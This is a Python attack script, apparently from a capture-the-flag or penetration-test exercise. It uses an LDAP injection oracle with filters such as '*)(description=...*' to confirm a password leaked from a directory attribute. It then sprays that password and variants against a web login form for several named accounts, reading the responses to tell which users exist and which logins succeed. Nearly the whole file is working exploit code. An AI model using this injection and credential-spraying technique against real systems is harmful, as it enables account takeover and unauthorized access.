#!/usr/bin/env python3
"""Verify extracted description, then test candidate passwords for a real login."""
import re

import pool_extract as P

P.init_pool()

print("=== verify exact description values ===", flush=True)
cands = [
    "change*th1s_p@ssw0rd!!",
    "change*th1s_p@ssw()rd!!",
    "change*th1s_p@ssw0rd",
    "th1s_p@ssw0rd!!",
    "change*th1s_p@ssw0rd!",
]
for c in cands:
    r = P.oracle(f"*)(description={P.esc(c)}*")
    print(f"  {'MATCH' if r else 'no   '} prefix {c!r}", flush=True)

print("\n=== password attempts (looking for a redirect/success) ===", flush=True)
users = ["auditor", "will.s", "mark.s", "ashley.b", "heather.s", "stephen.m",
         "patrick.s", "jennifer.a", "zeke.s", "tish.c"]
pws = ["th1s_p@ssw0rd!!", "change*th1s_p@ssw0rd!!", "th1s_p@ssw0rd"]

for u in users[:4]:
    for pw in pws:
        enc = P.dbl(u)
        s = P.Session()
        body = (f"Username={enc}&Password={pw.replace('@', '%40').replace('!', '%21').replace('*', '%2A')}"
                f"&RememberMe=false&__RequestVerificationToken={s.tok}")
        try:
            r = s.s.post(P.LOGIN, data=body.encode(),
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20, allow_redirects=False)
        except Exception as e:
            print(f"  {u}/{pw}: error {e}", flush=True)
            continue
        tag = "fail(exists)" if "Login attempt failed" in r.text else \
              "invalid" if "Invalid login attempt" in r.text else \
              f"*** {r.status_code} len={len(r.text)} {r.headers.get('Location','')} ***"
        print(f"  {u:12s} {pw:26s} -> {tag}", flush=True)

print(f"requests: {P.REQ[0]}", flush=True)
